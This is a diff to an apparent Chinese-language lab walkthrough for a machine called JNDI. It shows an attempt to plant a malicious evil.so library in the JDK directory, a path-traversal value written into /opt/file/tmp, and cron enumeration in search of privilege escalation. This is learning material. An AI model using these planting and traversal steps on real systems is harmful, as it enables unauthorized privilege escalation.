@@ -168,7 +168,74 @@ bluebird@JNDI:~$ mv evil.so /usr/local/java/jdk1.8.0_20/jre/lib/amd64/
 mv evil.so /usr/local/java/jdk1.8.0_20/jre/lib/amd64/
 mv: cannot move 'evil.so' to '/usr/local/java/jdk1.8.0_20/jre/lib/amd64/evil.so': Permission denied
 ```
-传evil.so到tmp，尝试路径穿越
+传evil.so到tmp，尝试路径穿越，搞完才发现这个任务是用户权限没法提权
 ```
 echo ../../../../tmp/evil.so > /opt/file/tmp
+```
+查看定时任务
+```bash 
+bluebird@JNDI:~/apache-tomcat-8.0.1$ cat /etc/crontab
+cat /etc/crontab
+# /etc/crontab: system-wide crontab
+# Unlike any other crontab you don't have to run the `crontab'
+# command to install the new version when you edit this file
+# and files in /etc/cron.d. These files also have username fields,
+# that none of the other crontabs do.
+
+SHELL=/bin/sh
+PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+
+# Example of job definition:
+# .---------------- minute (0 - 59)
+# |  .------------- hour (0 - 23)
+# |  |  .---------- day of month (1 - 31)
+# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
+# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
+# |  |  |  |  |
+# *  *  *  *  * user-name command to be executed
+17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
+25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
+47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
+52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
+#
+bluebird@JNDI:~/apache-tomcat-8.0.1$ ls -la /etc/cron*
+ls -la /etc/cron*
+-rw-r--r-- 1 root root 1042 Oct 11  2019 /etc/crontab
+
+/etc/cron.d:
+total 16
+drwxr-xr-x  2 root root 4096 Apr  1  2025 .
+drwxr-xr-x 82 root root 4096 Mar 27 10:25 ..
+-rw-r--r--  1 root root  712 Mar  9  2025 php
+-rw-r--r--  1 root root  102 Oct 11  2019 .placeholder
+
+/etc/cron.daily:
+total 36
+drwxr-xr-x  2 root root 4096 Apr  1  2025 .
+drwxr-xr-x 82 root root 4096 Mar 27 10:25 ..
+-rwxr-xr-x  1 root root  539 Jul  1  2024 apache2
+-rwxr-xr-x  1 root root 1478 Apr 19  2021 apt-compat
+-rwxr-xr-x  1 root root  355 Dec 29  2017 bsdmainutils
+-rwxr-xr-x  1 root root 1187 May 24  2022 dpkg
+-rwxr-xr-x  1 root root  377 Aug 28  2018 logrotate
+-rwxr-xr-x  1 root root  249 Sep 27  2017 passwd
+-rw-r--r--  1 root root  102 Oct 11  2019 .placeholder
+
+/etc/cron.hourly:
+total 12
+drwxr-xr-x  2 root root 4096 Mar 18  2025 .
+drwxr-xr-x 82 root root 4096 Mar 27 10:25 ..
+-rw-r--r--  1 root root  102 Oct 11  2019 .placeholder
+
+/etc/cron.monthly:
+total 12
+drwxr-xr-x  2 root root 4096 Mar 18  2025 .
+drwxr-xr-x 82 root root 4096 Mar 27 10:25 ..
+-rw-r--r--  1 root root  102 Oct 11  2019 .placeholder
+
+/etc/cron.weekly:
+total 12
+drwxr-xr-x  2 root root 4096 Mar 18  2025 .
+drwxr-xr-x 82 root root 4096 Mar 27 10:25 ..
+-rw-r--r--  1 root root  102 Oct 11  2019 .placeholder
 ```
